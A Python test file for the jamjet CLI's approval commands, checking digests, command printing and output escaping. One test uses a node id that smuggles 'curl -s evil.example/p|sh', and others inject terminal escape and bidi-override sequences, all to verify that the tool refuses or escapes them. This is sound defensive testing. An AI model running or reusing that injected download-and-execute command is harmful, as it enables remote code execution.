"""Tests for approval client methods and CLI commands."""

from __future__ import annotations

import json
from unittest.mock import AsyncMock, patch

import httpx
import pytest
import respx
from typer.testing import CliRunner

from jamjet.cli.main import app
from jamjet.client import JamjetClient

runner = CliRunner()

BASE = "http://localhost:7700"

# ---------------------------------------------------------------------------
# Client tests
# ---------------------------------------------------------------------------


@respx.mock
@pytest.mark.asyncio
async def test_approve_sends_node_id_when_given() -> None:
    """approve() includes node_id in the request body when provided."""
    route = respx.post(f"{BASE}/executions/exec-1/approve").respond(
        200,
        json={"execution_id": "exec-1", "node_id": "gated", "accepted": True},
    )

    async with JamjetClient(base_url=BASE) as c:
        result = await c.approve("exec-1", "approved", node_id="gated")

    assert route.called
    body = json.loads(route.calls[0].request.content)
    assert body["decision"] == "approved"
    assert body["node_id"] == "gated"
    assert result["node_id"] == "gated"


@respx.mock
@pytest.mark.asyncio
async def test_approve_omits_node_id_when_not_given() -> None:
    """approve() omits node_id from the body when not supplied."""
    route = respx.post(f"{BASE}/executions/exec-1/approve").respond(
        200,
        json={"execution_id": "exec-1", "node_id": "inferred", "accepted": True},
    )

    async with JamjetClient(base_url=BASE) as c:
        await c.approve("exec-1", "approved")

    body = json.loads(route.calls[0].request.content)
    assert "node_id" not in body
    assert body["decision"] == "approved"


@respx.mock
@pytest.mark.asyncio
async def test_approve_with_state_patch_surfaces_the_runtime_refusal() -> None:
    """The runtime refuses approval edits with 400; approve() raises it."""
    route = respx.post(f"{BASE}/executions/exec-1/approve").respond(
        400,
        json={"error": "approval edits are not supported: a decision cannot carry a state_patch"},
    )

    async with JamjetClient(base_url=BASE) as c:
        with pytest.raises(httpx.HTTPStatusError) as exc:
            await c.approve("exec-1", "approved", state_patch={"amount": 5})

    assert exc.value.response.status_code == 400
    body = json.loads(route.calls[0].request.content)
    assert body["state_patch"] == {"amount": 5}


@respx.mock
@pytest.mark.asyncio
async def test_approve_sends_the_action_digest_it_was_given() -> None:
    """approve() passes the reviewed digest through, and omits it when absent."""
    route = respx.post(f"{BASE}/executions/exec-1/approve").respond(
        200, json={"execution_id": "exec-1", "node_id": "gated", "accepted": True}
    )

    async with JamjetClient(base_url=BASE) as c:
        await c.approve("exec-1", "approved", node_id="gated", action_digest="d-1")
        await c.approve("exec-1", "rejected", node_id="gated")

    assert json.loads(route.calls[0].request.content)["action_digest"] == "d-1"
    assert "action_digest" not in json.loads(route.calls[1].request.content)


@respx.mock
@pytest.mark.asyncio
async def test_list_approvals_returns_parsed_dict() -> None:
    """list_approvals() GETs /executions/{id}/approvals and returns the body."""
    payload = {
        "pending": [
            {
                "node_id": "gated",
                "tool_name": "payments.transfer",
                "approver": "human",
                "context": {},
                "sequence": 3,
            }
        ],
        "decided": [
            {
                "node_id": "old",
                "status": "approved",
                "user_id": "u1",
                "sequence": 1,
            }
        ],
    }
    route = respx.get(f"{BASE}/executions/exec-1/approvals").respond(200, json=payload)

    async with JamjetClient(base_url=BASE) as c:
        result = await c.list_approvals("exec-1")

    assert route.called
    assert result["pending"][0]["node_id"] == "gated"
    assert result["decided"][0]["status"] == "approved"


# ---------------------------------------------------------------------------
# CLI tests — jamjet approvals
# ---------------------------------------------------------------------------


def _approvals_client(pending: list, decided: list):
    """Return a patched _client() whose list_approvals returns the given data."""
    fake = AsyncMock()
    fake.list_approvals = AsyncMock(return_value={"pending": pending, "decided": decided})
    fake.__aenter__ = AsyncMock(return_value=fake)
    fake.__aexit__ = AsyncMock(return_value=None)
    return fake


def test_approvals_renders_pending_and_decided() -> None:
    """jamjet approvals renders both pending and decided entries."""
    pending = [
        {
            "node_id": "gated",
            "tool_name": "payments.transfer",
            "approver": "human",
            "context": {},
            "sequence": 3,
        }
    ]
    decided = [
        {
            "node_id": "old",
            "status": "approved",
            "user_id": "u1",
            "sequence": 1,
        }
    ]
    fake = _approvals_client(pending, decided)

    with patch("jamjet.cli.main._client", return_value=fake):
        result = runner.invoke(app, ["approvals", "exec-1"])

    assert result.exit_code == 0, result.output
    assert "gated" in result.output
    assert "payments.transfer" in result.output
    assert "old" in result.output
    assert "approved" in result.output


def test_approvals_shows_empty_state_message() -> None:
    """jamjet approvals shows a friendly message when there is nothing pending."""
    fake = _approvals_client([], [])

    with patch("jamjet.cli.main._client", return_value=fake):
        result = runner.invoke(app, ["approvals", "exec-1"])

    assert result.exit_code == 0, result.output
    # Should not raise and should print something useful
    assert result.output.strip() != ""


DIGEST = "ab" * 32


def _bound_pending() -> list:
    return [
        {
            "node_id": "gated",
            "tool_name": "myapp.payments:transfer",
            "approver": "human",
            "context": {
                "node_id": "gated",
                "action_digest": DIGEST,
                "action_step": 0,
                "action_basis": {
                    "payload": {"module": "myapp.payments", "input": {"amount": 10}},
                    "payload_truncated": False,
                    "payload_bytes": 58,
                    "step": 0,
                    "node": {"id": "gated"},
                },
            },
            "sequence": 3,
        }
    ]


def test_approvals_shows_the_full_digest_to_echo() -> None:
    """The listing prints the digest `jamjet approve --action-digest` needs, whole."""
    fake = _approvals_client(_bound_pending(), [])

    with patch("jamjet.cli.main._client", return_value=fake):
        result = runner.invoke(app, ["approvals", "exec-1"])

    assert result.exit_code == 0, result.output
    assert DIGEST in result.output
    assert f"--action-digest={DIGEST}" in result.output


def test_approvals_summarises_what_the_digest_covers() -> None:
    fake = _approvals_client(_bound_pending(), [])

    with patch("jamjet.cli.main._client", return_value=fake):
        result = runner.invoke(app, ["approvals", "exec-1"])

    assert result.exit_code == 0, result.output
    assert "step 0" in result.output
    assert "input: amount=10" in result.output


def test_approvals_show_basis_prints_the_bound_payload() -> None:
    fake = _approvals_client(_bound_pending(), [])

    with patch("jamjet.cli.main._client", return_value=fake):
        result = runner.invoke(app, ["approvals", "exec-1", "--show-basis"])

    assert result.exit_code == 0, result.output
    assert '"amount": 10' in result.output
    assert '"module": "myapp.payments"' in result.output


def test_approvals_shows_the_calls_hash_of_a_dispatch_request() -> None:
    pending = [
        {
            "node_id": "agent",
            "tool_name": "send_wire",
            "approver": "human",
            "context": {"node_id": "agent", "calls_hash": "h-123", "calls": [{"name": "send_wire", "arguments": {}}]},
            "sequence": 4,
        }
    ]
    fake = _approvals_client(pending, [])

    with patch("jamjet.cli.main._client", return_value=fake):
        result = runner.invoke(app, ["approvals", "exec-1"])

    assert result.exit_code == 0, result.output
    assert "--action-digest=h-123" in result.output
    assert "calls: send_wire" in result.output


def test_approvals_names_the_calls_a_bound_dispatch_digest_covers() -> None:
    pending = [
        {
            "node_id": "agent",
            "tool_name": "send_wire",
            "approver": "human",
            "context": {
                "calls_hash": "h-123",
                "action_digest": DIGEST,
                "action_basis": {
                    "payload": {"calls": [{"name": "send_wire", "arguments": {}}]},
                    "payload_truncated": False,
                    "payload_bytes": 50,
                    "step": 1,
                },
            },
            "sequence": 5,
        }
    ]
    fake = _approvals_client(pending, [])

    with patch("jamjet.cli.main._client", return_value=fake):
        result = runner.invoke(app, ["approvals", "exec-1"])

    assert result.exit_code == 0, result.output
    assert f"--action-digest={DIGEST}" in result.output
    assert "step 1; calls: send_wire({})" in result.output


def test_approvals_shows_the_handler_a_call_resolves_to() -> None:
    """A dispatch call named `lookup` can resolve to other code through the
    run's tools map; the reviewer must see which."""
    pending = [
        {
            "node_id": "agent",
            "tool_name": "lookup",
            "approver": "human",
            "context": {
                "calls_hash": "h-1",
                "action_digest": DIGEST,
                "action_basis": {
                    "payload": {"calls": [{"name": "lookup", "arguments": {}, "handler": "bank.wires:send_wire"}]},
                    "payload_truncated": False,
                    "payload_bytes": 80,
                    "step": 0,
                },
            },
            "sequence": 5,
        }
    ]
    fake = _approvals_client(pending, [])

    with patch("jamjet.cli.main._client", return_value=fake):
        result = runner.invoke(app, ["approvals", "exec-1"])

    assert result.exit_code == 0, result.output
    assert "calls: lookup -> bank.wires:send_wire({})" in result.output


def _approve_lines(output: str) -> list[str]:
    return [line for line in output.splitlines() if line.lstrip().startswith("jamjet approve")]


def test_no_command_is_printed_for_a_node_id_outside_the_safe_set() -> None:
    """Registration refuses such ids now, but a workflow stored before this
    version can still have one. No paste-ready command is printed for it (POSIX
    quoting does not protect every shell, fish among them); the listing says
    why."""
    evil = "x; curl -s evil.example/p|sh #"
    pending = _bound_pending()
    pending[0]["node_id"] = evil
    fake = _approvals_client(pending, [])

    with patch("jamjet.cli.main._client", return_value=fake):
        result = runner.invoke(app, ["approvals", "exec-1"])

    assert result.exit_code == 0, result.output
    assert _approve_lines(result.output) == [], result.output
    assert "not in the safe set" in result.output


def test_the_printed_approve_command_is_quoted_and_alone() -> None:
    import shlex

    pending = _bound_pending()
    pending[0]["node_id"] = "fetch.v2-step_1"
    fake = _approvals_client(pending, [])

    with patch("jamjet.cli.main._client", return_value=fake):
        result = runner.invoke(app, ["approvals", "exec-1"])

    lines = _approve_lines(result.output)
    assert len(lines) == 1, result.output
    assert shlex.split(lines[0]) == [
        "jamjet",
        "approve",
        "exec-1",
        "--decision",
        "approved",
        "--node-id=fetch.v2-step_1",
        f"--action-digest={DIGEST}",
    ]


def test_a_dash_leading_node_id_is_not_read_as_an_option() -> None:
    import shlex

    pending = _bound_pending()
    pending[0]["node_id"] = "-rf"
    fake = _approvals_client(pending, [])

    with patch("jamjet.cli.main._client", return_value=fake):
        result = runner.invoke(app, ["approvals", "exec-1"])

    assert "--node-id=-rf" in shlex.split(_approve_lines(result.output)[0])


def test_approvals_escapes_control_characters_from_the_run() -> None:
    """Node ids, tool names, input keys and values come from whoever started the
    run. Printed raw, an ESC sequence could erase or rewrite the reviewer's
    lines, and a bidi override could reorder them."""
    pending = [
        {
            "node_id": "gate\x1b[2K",
            "tool_name": "[bold]t\x07",
            "approver": "human",
            "context": {
                "action_digest": DIGEST,
                "action_basis": {
                    "payload": {"input": {"a\x1b[1A\x1b[2KFAKE": "x\u202eevil"}},
                    "payload_truncated": False,
                    "payload_bytes": 40,
                    "step": 0,
                },
            },
            "sequence": 3,
        }
    ]
    decided = [{"node_id": "old", "status": "approved", "user_id": "u\x1b]0;t\x07", "comment": "c\x9bX", "sequence": 1}]
    fake = _approvals_client(pending, decided)

    with patch("jamjet.cli.main._client", return_value=fake):
        result = runner.invoke(app, ["approvals", "exec-1"])

    assert result.exit_code == 0, result.output
    for raw in ("\x1b", "\x07", "\u202e", "\x9b"):
        assert raw not in result.output, repr(raw)
    assert "\\x1b" in result.output
    assert "\\u202e" in result.output
    assert "[bold]t" in result.output, "markup in a field is printed, not applied"


def test_approvals_shows_bounded_values_not_only_keys() -> None:
    pending = _bound_pending()
    pending[0]["context"]["action_basis"]["payload"]["input"] = {
        "amount": 10,
        "to": "vendor",
        "blob": "x" * 500,
    }
    fake = _approvals_client(pending, [])

    with patch("jamjet.cli.main._client", return_value=fake):
        result = runner.invoke(app, ["approvals", "exec-1"])

    assert result.exit_code == 0, result.output
    assert "amount=10" in result.output
    assert 'to="vendor"' in result.output
    assert "x" * 100 not in result.output, "a long value is cut"
    assert "…" in result.output


def test_approvals_says_when_a_request_binds_nothing() -> None:
    pending = [{"node_id": "old", "tool_name": "t", "approver": "human", "context": {}, "sequence": 2}]
    fake = _approvals_client(pending, [])

    with patch("jamjet.cli.main._client", return_value=fake):
        result = runner.invoke(app, ["approvals", "exec-1"])

    assert result.exit_code == 0, result.output
    assert "no digest" in result.output


# ---------------------------------------------------------------------------
# CLI tests — jamjet approve
# ---------------------------------------------------------------------------


def _approve_client(response: dict):
    fake = AsyncMock()
    fake.approve = AsyncMock(return_value=response)
    fake.__aenter__ = AsyncMock(return_value=fake)
    fake.__aexit__ = AsyncMock(return_value=None)
    return fake


def test_approve_without_node_id_prints_resolved_node() -> None:
    """jamjet approve prints resolved node_id on success."""
    fake = _approve_client({"execution_id": "exec-1", "node_id": "gated", "accepted": True})

    with patch("jamjet.cli.main._client", return_value=fake):
        result = runner.invoke(app, ["approve", "exec-1", "--decision", "approved"])

    assert result.exit_code == 0, result.output
    assert "gated" in result.output
    fake.approve.assert_awaited_once()
    call_kwargs = fake.approve.call_args
    # node_id should not be passed when not specified
    assert call_kwargs.kwargs.get("node_id") is None


def test_approve_with_node_id_and_comment_passes_both() -> None:
    """jamjet approve --node-id X --comment Y sends both to client."""
    fake = _approve_client({"execution_id": "exec-1", "node_id": "gated", "accepted": True})

    with patch("jamjet.cli.main._client", return_value=fake):
        result = runner.invoke(
            app,
            ["approve", "exec-1", "--decision", "approved", "--node-id", "gated", "--comment", "no"],
        )

    assert result.exit_code == 0, result.output
    call_kwargs = fake.approve.call_args
    assert call_kwargs.kwargs.get("node_id") == "gated"
    assert call_kwargs.kwargs.get("comment") == "no"


def test_approve_409_exits_nonzero_with_error_text() -> None:
    """jamjet approve exits 1 on 409 and prints the server error, not a traceback."""
    error_body = {"error": "no pending approval on this execution"}

    # Build a real httpx.HTTPStatusError the CLI handler will catch
    request = httpx.Request("POST", f"{BASE}/executions/exec-1/approve")
    response = httpx.Response(409, json=error_body, request=request)
    http_error = httpx.HTTPStatusError("409", request=request, response=response)

    fake = AsyncMock()
    fake.approve = AsyncMock(side_effect=http_error)
    fake.__aenter__ = AsyncMock(return_value=fake)
    fake.__aexit__ = AsyncMock(return_value=None)

    with patch("jamjet.cli.main._client", return_value=fake):
        result = runner.invoke(app, ["approve", "exec-1", "--decision", "approved"])

    assert result.exit_code != 0
    assert "no pending approval" in result.output
    # Must not be a traceback dump
    assert "Traceback" not in result.output


def test_approve_invalid_decision_fails_cleanly() -> None:
    """jamjet approve --decision maybe produces a parameter error, not a traceback."""
    result = runner.invoke(app, ["approve", "exec-1", "--decision", "maybe"])
    assert result.exit_code != 0
    assert "Traceback" not in result.output
    # Should mention the invalid value or expected values
    output = result.output + (result.stderr or "")
    assert "maybe" in output or "approved" in output or "rejected" in output


def test_approve_passes_the_action_digest_option_through() -> None:
    """jamjet approve --action-digest D sends D to the client."""
    fake = _approve_client({"execution_id": "exec-1", "node_id": "gated", "accepted": True})

    with patch("jamjet.cli.main._client", return_value=fake):
        result = runner.invoke(app, ["approve", "exec-1", "--decision", "approved", "--action-digest", "d-1"])

    assert result.exit_code == 0, result.output
    assert fake.approve.call_args.kwargs.get("action_digest") == "d-1"


def test_the_printed_approve_command_round_trips() -> None:
    """Split as a shell would, the printed line drives `jamjet approve` with
    exactly the listed node id and digest."""
    import shlex

    pending = _bound_pending()
    pending[0]["node_id"] = "-step.v2"
    with patch("jamjet.cli.main._client", return_value=_approvals_client(pending, [])):
        listing = runner.invoke(app, ["approvals", "exec-1"])
    argv = shlex.split(_approve_lines(listing.output)[0])
    assert argv[:2] == ["jamjet", "approve"]

    fake = _approve_client({"execution_id": "exec-1", "node_id": "-step.v2", "accepted": True})
    with patch("jamjet.cli.main._client", return_value=fake):
        result = runner.invoke(app, argv[1:])

    assert result.exit_code == 0, result.output
    kwargs = fake.approve.call_args.kwargs
    assert kwargs.get("node_id") == "-step.v2", fake.approve.call_args
    assert kwargs.get("action_digest") == DIGEST


def test_approve_output_escapes_what_the_server_returns() -> None:
    """The node id and an error message come back from the server and can
    carry run-supplied text: shown escaped, never applied as markup."""
    fake = _approve_client({"execution_id": "exec-1", "node_id": "[bold]n\x1b[2K", "accepted": True})
    with patch("jamjet.cli.main._client", return_value=fake):
        result = runner.invoke(app, ["approve", "exec-1", "--decision", "approved", "--action-digest", "d"])
    assert result.exit_code == 0, result.output
    assert "\x1b" not in result.output
    assert "[bold]n\\x1b[2K" in result.output

    import httpx

    request = httpx.Request("POST", "http://x/executions/exec-1/approve")
    response = httpx.Response(403, json={"error": "refused [red]x\x1b]0;t\x07"}, request=request)
    failing = AsyncMock()
    failing.approve = AsyncMock(side_effect=httpx.HTTPStatusError("403", request=request, response=response))
    failing.__aenter__ = AsyncMock(return_value=failing)
    failing.__aexit__ = AsyncMock(return_value=None)
    with patch("jamjet.cli.main._client", return_value=failing):
        result = runner.invoke(app, ["approve", "exec-1", "--decision", "approved", "--action-digest", "d"])
    assert result.exit_code == 1
    assert "\x1b" not in result.output and "\x07" not in result.output
    assert "refused [red]x\\x1b]0;t\\x07" in result.output


def test_a_long_key_cannot_push_the_values_out_of_the_summary() -> None:
    """Keys are bounded like values, so a long key cannot fill the covers line
    and hide what follows it."""
    pending = _bound_pending()
    pending[0]["context"]["action_basis"]["payload"]["input"] = {
        "a" + "k" * 600: 1,
        "to": "mallory",
    }
    fake = _approvals_client(pending, [])

    with patch("jamjet.cli.main._client", return_value=fake):
        result = runner.invoke(app, ["approvals", "exec-1"])

    assert result.exit_code == 0, result.output
    assert 'to="mallory"' in result.output
